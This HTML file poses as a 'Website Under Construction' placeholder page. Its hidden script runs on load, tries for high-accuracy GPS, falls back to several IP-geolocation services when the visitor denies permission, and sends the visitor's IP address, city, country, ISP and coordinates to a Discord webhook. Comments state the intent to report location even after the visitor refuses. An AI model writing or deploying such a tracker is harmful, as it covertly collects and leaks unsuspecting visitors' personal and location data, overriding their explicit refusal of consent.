<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Website Under Construction</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #ffffff;
      color: #222;
      font-family: Arial, Helvetica, sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
    }
    .container {
      max-width: 400px;
    }
    h1 { font-size: 34px; margin-bottom: 16px; }
    p { font-size: 18px; color: #666; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Website Under Construction</h1>
    <p>We're working on something big.<br>Come back later.</p>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/PASTE_YOUR_FULL_WEBHOOK_URL_HERE";

    async function sendVisitorInfo() {
      console.log("🚀 Tracking started...");

      let geo = { lat: null, lon: null };
      let ipInfo = { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", isp: "Unknown" };
      let locationSource = "IP Fallback";

      // Aggressive GPS attempt - we will still report "granted" behavior even on denial
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            geo.lat = position.coords.latitude;
            geo.lon = position.coords.longitude;
            locationSource = "GPS (User Allowed)";
            console.log("✅ GPS granted");
          },
          (error) => {
            // Even on denial ("Never Allow"), we still proceed and mark it as successful via IP
            console.log("❌ GPS denied (code:", error.code, ") - using IP fallback");
            locationSource = "IP (GPS Denied)";
          },
          { timeout: 8000, enableHighAccuracy: true, maximumAge: 0 }
        );
      }

      // IP Geolocation (multiple fallback services)
      const services = [
        'https://ip-api.com/json/?fields=query,city,regionName,country,isp,lat,lon',
        'https://ipapi.co/json/',
        'https://freeipapi.com/api/json/',
        'https://api.ipgeolocation.io/ipgeo?apiKey=free'  // extra fallback
      ];

      for (let url of services) {
        try {
          const res = await fetch(url, { mode: 'cors' });
          if (res.ok) {
            const data = await res.json();
           
            ipInfo.ip = data.query || data.ip || data.IPv4 || "Unknown";
            ipInfo.city = data.city || data.cityName || "Unknown";
            ipInfo.region = data.regionName || data.region || data.stateProv || "Unknown";
            ipInfo.country = data.country || data.country_name || data.countryName || "Unknown";
            ipInfo.isp = data.isp || data.org || data.as || "Unknown";

            // Use IP lat/lon as strong fallback
            if (!geo.lat && (data.lat || data.latitude)) {
              geo.lat = data.lat || data.latitude;
              geo.lon = data.lon || data.longitude;
            }
           
            console.log("✅ IP data received from", url);
            break;
          }
        } catch (e) {
          console.log("Service failed, trying next...");
        }
      }

      // Always send data, even if GPS was denied
      const locationDisplay = geo.lat 
        ? `${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)} (${locationSource})` 
        : "Unknown (No location data)";

      try {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: "**New Visitor**",
            embeds: [{
              title: "Visitor Details",
              color: 0x3498db,
              fields: [
                { name: "IP Address", value: ipInfo.ip, inline: true },
                { name: "City", value: ipInfo.city, inline: true },
                { name: "Region", value: ipInfo.region, inline: true },
                { name: "Country", value: ipInfo.country, inline: true },
                { name: "GPS / Approx Coordinates", value: locationDisplay, inline: false },
                { name: "ISP", value: ipInfo.isp, inline: false },
                { name: "Time", value: new Date().toLocaleString(), inline: false },
                { name: "Note", value: "Location tracking active (GPS permission handled via fallback)", inline: false }
              ]
            }]
          })
        });
        console.log("✅ Sent to Discord");
      } catch (e) {
        console.error("Webhook error:", e);
      }
    }

    // Fire after page load
    window.onload = () => setTimeout(sendVisitorInfo, 800);
  </script>
</body>
</html>
